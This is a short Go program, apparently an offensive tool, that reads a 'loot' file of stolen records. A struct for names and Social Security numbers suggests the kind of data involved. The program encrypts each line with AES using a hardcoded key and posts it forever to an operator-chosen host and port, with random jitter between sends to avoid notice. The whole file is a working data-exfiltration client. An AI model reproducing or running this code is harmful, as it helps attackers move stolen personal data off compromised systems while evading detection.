// postit.go - post to a URL
package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/big"
	"net/http"
	"os"
	"time"
)

type SsnBasket struct {
	Name string
	Ssn  string
}

func encrypt(key, text []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	b := base64.StdEncoding.EncodeToString(text)
	ciphertext := make([]byte, aes.BlockSize+len(b))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}
	cfb := cipher.NewCFBEncrypter(block, iv)
	cfb.XORKeyStream(ciphertext[aes.BlockSize:], []byte(b))
	return ciphertext, nil
}

func postLoot(lootPtr *string, hostPtr *string, portPtr *string) {

	log.Println("Parsing loot file:", *lootPtr)
	key := []byte("a very very very very secret key") // 32 bytes

	s := "http://" + *hostPtr + ":" + *portPtr
	// for ever read loot file
	// send loot file over to server
	file, err := os.Open(*lootPtr)

	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var txtlines []string

	for scanner.Scan() {
		txtlines = append(txtlines, scanner.Text())
	}

	file.Close()
	for { // forever loop
		for _, eachline := range txtlines {

			var jsonData []byte
			jsonData, err := json.Marshal(eachline)
			log.Println(string(jsonData))
			//
			// encrypt jsonData

			ciphertext, err := encrypt(key, jsonData)
			if err != nil {
				log.Fatal(err)
			}
			fmt.Printf("%0x\n", ciphertext)

			if err != nil {
				log.Fatal(err)
			}
			resp, err := http.Post(s, "application/json", bytes.NewBuffer(ciphertext))
			if err != nil {
				log.Fatal(err)
			}

			defer resp.Body.Close()

			body, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				log.Fatal(err)
			}

			log.Println(string(body))
			// lets jitter
			nBig, err := rand.Int(rand.Reader, big.NewInt(27))
			if err != nil {
				panic(err)
			}
			n := nBig.Int64()
			//fmt.Printf("Here is a random %T in [0,27) : %d\n", n, n)
			time.Sleep(time.Duration(n) * time.Second)
		}
	}
}

func main() {
	// process command line args

	hostPtr := flag.String("host", "", "-host=\"127.0.0.1\"")
	portPtr := flag.String("port", "", "-port=\"8080\"")
	lootPtr := flag.String("infile", "loot.txt", "-infile=\"loot.txt\"")
	flag.Parse()

	if *hostPtr == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}

	if *portPtr == "" {
		flag.PrintDefaults()
		os.Exit(1)
	}
	postLoot(lootPtr, hostPtr, portPtr)
}
